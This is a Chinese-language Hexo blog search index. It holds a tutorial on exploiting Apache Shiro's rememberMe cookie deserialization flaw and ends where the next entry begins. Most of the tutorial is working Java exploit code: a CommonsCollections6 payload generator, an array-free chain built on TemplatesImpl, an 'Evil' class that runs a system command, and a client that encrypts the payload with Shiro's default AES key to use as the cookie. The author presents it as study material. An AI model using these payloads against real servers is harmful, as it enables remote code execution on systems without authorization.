<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA-Shiro反序列化详解</title>
      <link href="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>参考 ：<a href="https://blog.csdn.net/m0_67401270/article/details/126721347">Shiro环境搭建</a></p><h1 id="前景回顾"><a href="#前景回顾" class="headerlink" title="前景回顾"></a>前景回顾</h1><p>shiro爆出了一个默认key的反序列化漏洞。至今已有大量的分析文章分析了该漏洞的原理，所以本文不再重复分析该漏洞的相关原理，可以参考以下几篇文章的分析：</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></li><li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>也可以参考我在CSDN 中写过的文章:<br><a href="https://blog.csdn.net/snowlyzz/article/details/128192360?spm=1001.2014.3001.5501">[Java反序列化]—Shiro反序列化(二)_反序列化cc链_snowlyzz的博客-CSDN博客</a><br>原因可能是当时写的不够详细，也不够深入，至此，本站的博客都 会打造一个 详细深入的学习</p><p>进入正题：</p><p>如果登录时选择了remember me的多选框，则登录成功后服务端会返回一个rememberMe的Cookie：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/1.jpg"></p><p>对此，我们攻击过程如下： </p><ol><li>使用以前学过的CommonsCollections利用链生成一个序列化Payload </li><li>使用Shiro默认Key进行加密 </li><li>将密文作为rememberMe的Cookie发送给服务端：</li></ol><p>这里结合CC6  编写成一个CLASS进行触发链子：</p><p>CC6.CLASS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line">    public byte[] getPayload(String command) throws Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                        new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,</span><br><span class="line">                        new String[] &#123; command &#125;),</span><br><span class="line">                new ConstantTransformer(1),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(&quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String []args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollections6().getPayload(&quot;calc.exe&quot;);  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是将 参数传入CC6 ，再将payload 进行 aes 加密，传入 Shiro 客户端中会发现结果没有像预想那样 弹出计算器，这是为什么？</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/x.jpg"></p><p>我们从报错信息 从下往上看， 看到倒数第一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br></pre></td></tr></table></figure><p>可以看到这是一个 ObjectInputStream 的一个内置类，重写了其 resolveClass 方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ClassResolvingObjectInputStream extends ObjectInputStream &#123;  </span><br><span class="line">  </span><br><span class="line">    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException &#123;  </span><br><span class="line">        super(inputStream);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /**  </span><br><span class="line">     * Resolves an &#123;@link ObjectStreamClass&#125; by delegating to Shiro&#x27;s   </span><br><span class="line">     * &#123;@link ClassUtils#forName(String)&#125; utility method, which is known to work in all ClassLoader environments.  </span><br><span class="line">     ** @param osc the ObjectStreamClass to resolve the class name.  </span><br><span class="line">     * @return the discovered class  </span><br><span class="line">     * @throws IOException never - declaration retained for subclass consistency  </span><br><span class="line">     * @throws ClassNotFoundException if the class could not be found in any known ClassLoader  </span><br><span class="line">     */    @Override  </span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            return ClassUtils.forName(osc.getName());  </span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;  </span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```txt</span><br><span class="line">**resolveClass这个方法是Java原生反序列的时候必定会调用的，这里重写了就不会调用Java内置的resolveClass了**</span><br></pre></td></tr></table></figure><p>resolveClass 是反序列化用来查找类的一个方法，在读取序列化流的时候，督导一个字符串形式的类名，需要通过这个方法来找到对应的 Java.lang.CLass对象</p><p>对比一下其父类的 resolveClass，也就是 ObjectInputStream 中的  方法 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)  </span><br><span class="line">    throws IOException, ClassNotFoundException  </span><br><span class="line">&#123;  </span><br><span class="line">    String name = desc.getName();  </span><br><span class="line">    try &#123;  </span><br><span class="line">        return Class.forName(name, false, latestUserDefinedLoader());  </span><br><span class="line">    &#125; catch (ClassNotFoundException ex) &#123;  </span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);  </span><br><span class="line">        if (cl != null) &#123;  </span><br><span class="line">            return cl;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            throw ex;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别就是 前者用的是 org.apache.shiro.util.ClassUtils#forName , 先跟进这个forName ClassUtils#看一眼  这里首先使用了THREAD_CL_ACCESSOR.loadClass类加载器，这里手动F9就会发现fqcn变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[L是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</span><br></pre></td></tr></table></figure><p>那么我们在异常捕捉的位置下个断点，看看是哪个类触发了异常：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/5.jpg"></p><p>可见，出异常时加载的类名为&#96;&#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Lorg.apache.commons.collections.Transformer; 。这个类名看起来 怪，其实就是表示 org.apache.commons.collections.Transformer 的数组。</span><br></pre></td></tr></table></figure><p>看了网上文章的解释是 ：</p><ol><li>数组形式会使得shiro想尝试从本地加载时，path也被赋上数组标识，导致无法从本地jar包中正常获取。</li><li>Class.forName 支持加载数组，而 ClassLoader.loadClass 不支持 加载数组，这个区别导致了问题。</li></ol><p>这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><h1 id="构造不含数组的反序列化链"><a href="#构造不含数组的反序列化链" class="headerlink" title="构造不含数组的反序列化链"></a>构造不含数组的反序列化链</h1><p>我们的链子 要满足没有数组的情况，也就是不能用 ChainedTransformer#transform</p><p>参考 安全漫谈和此文<br><a href="https://www.anquanke.com/post/id/192619">Java反序列化利用链分析之Shiro反序列化-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>我们可以用到 TemplatesImpl 也就是我们的CC3 来进行拼接，我们可以通过以下几行代码来执行一段JAVA 的字节码 ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">    TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">    setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">    setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">    setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 我们又可以 使用 InvokeTransformer 去反射调用 TemplatesImpl#newTransformer方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123; </span><br><span class="line">new ConstantTransformer(obj), </span><br><span class="line">new InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;</span><br></pre></td></tr></table></figure><p>不过这里任然是 数组，那么如何 过程中的 Transformer数组呢？</p><p>在CC6中 用到了一个类   TiedMapEntry ，其构造方法中接收两个参数，一个是Map  ，第二个是Key</p><p>TiedMapEntry 有个 getValue 方法，调用了 map 的get 方法，并且传入了 key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123; </span><br><span class="line">return map.get(key); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个map是LazyMap时，其get方法就是触发transform的关键点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;  </span><br><span class="line">    // create value for key if key is not currently in the map  </span><br><span class="line">    if (map.containsKey(key) == false) &#123;  </span><br><span class="line">        Object value = factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        return value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，因为 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。</p><p>但是 此时我们无法使用Transformer 数组了，也就不能再使用 ConstantTransformer。</p><p>我们将注意力关注在  InvokerTransformer.transform上</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/tr.png"></p><p>这里是最经典的反射写法，根据传入的 input对象，调用其 iMethodName(可控) 那么如果这里传入的是我们构造好的 TemplatesImpl 对象呢，他是否可以调用 newtransform加载字节码</p><p>很明显，这样我们就可以通过将<code>iMethodName</code>置为<code>newTransformer</code>，从而完成后续的templates gadgets。</p><p>这里将 构造好的TemplatesImpl 对象 (key) 作为 InvokerTransformer.transform的函数的input传入，我们就可以将链子串联起来了</p><h1 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h1><p>首先还是 创建利用点  TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一 个人畜无害的方法，比如 getClass ，避免恶意方法在构造Gadget的时候触发：</p><p><code>Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</code></p><p>再把 CC6的代码复制过来 然后改上一节说到的点，就是将原来TiedMapEntry 构造时的第二个参数key，改为前面创建的 TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap innermap = new HashMap();  </span><br><span class="line">//outMap = LazyMap.class  </span><br><span class="line">Map outmap = LazyMap.decorate(innermap, transformer); </span><br><span class="line">//此时 factory=InvokerTransformer.transform(key)  此时要调用get传key进去  </span><br><span class="line">  </span><br><span class="line">//接上LazyMap 调用get 传key 步骤：  </span><br><span class="line">TiedMapEntry tme = new TiedMapEntry(outmap, obj);  </span><br><span class="line">  </span><br><span class="line">Map expMap = new HashMap();  </span><br><span class="line">expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">outmap.clear();</span><br></pre></td></tr></table></figure><p>这里使用 outerMap.remove(“keykey”); 来移 除key的副作用，现在是通过 outerMap.clear(); ，效果相同。 </p><h2 id="调用顺序"><a href="#调用顺序" class="headerlink" title="调用顺序"></a>调用顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put()</span><br><span class="line">=&gt;java.util.HashMap.hash()</span><br><span class="line">=&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry#hashCode()</span><br><span class="line">=&gt;TiedMapEntry#getValue(key=Transform恶意类)</span><br><span class="line"></span><br><span class="line">LazyMap#get()</span><br><span class="line">=&gt; LazyMap.decorate(Map=innerMap, factory=InvokerTransformer)</span><br><span class="line">=&gt; get() -&gt; InvokerTransformer.transform(Transform恶意类)</span><br><span class="line"></span><br><span class="line">InvokerTransformer#transform()</span><br><span class="line">input = Transform恶意类</span><br><span class="line">iMethodName = newTransformer (可控)</span><br><span class="line">iParamTypes = code (可控)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，将 InvokerTransformer 的方法从人畜无害的 getClass ，改成 newTransformer ，正式完成武 器装配。</p><p>完整POC：</p><p>CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.ObjectOutputStream;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            //TemplatesImpl恶意类  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            //Faketransform  </span><br><span class="line">            Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);  </span><br><span class="line">            //LazyMap.class  </span><br><span class="line">            Map innerMap = new HashMap();  </span><br><span class="line">            Map outerMap = LazyMap.decorate(innerMap, transformer);  </span><br><span class="line">            //TiedMapEntry.class  </span><br><span class="line">            TiedMapEntry tme = new TiedMapEntry(outerMap, obj);  </span><br><span class="line">            //HashMap.class  </span><br><span class="line">            Map expMap = new HashMap();  </span><br><span class="line">            expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">            outerMap.clear();  </span><br><span class="line">            //将假的transform 中的  method 改成 newTransformer            setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);  </span><br><span class="line">  </span><br><span class="line">            // ==================  </span><br><span class="line">            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(expMap);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>写个Client 类配合 CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import javassist.ClassPool;  </span><br><span class="line">import javassist.CtClass;  </span><br><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();  </span><br><span class="line">  </span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>evil.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line">public class Evil extends AbstractTranslet &#123;  </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public Evil() throws Exception &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        System.out.println(&quot;Hello TemplatesImpl&quot;);  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把cookie传入shiro客户端 成功弹出计算器：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/99.jpg"></p><h1 id="CommonsBeanutils-无依赖攻击"><a href="#CommonsBeanutils-无依赖攻击" class="headerlink" title="CommonsBeanutils(无依赖攻击)"></a>CommonsBeanutils(无依赖攻击)</h1><p>待更，其实之前也审过</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections6</title>
      <link href="/2023/05/17/JAVA-CommonsCollections6/"/>
      <url>/2023/05/17/JAVA-CommonsCollections6/</url>
      
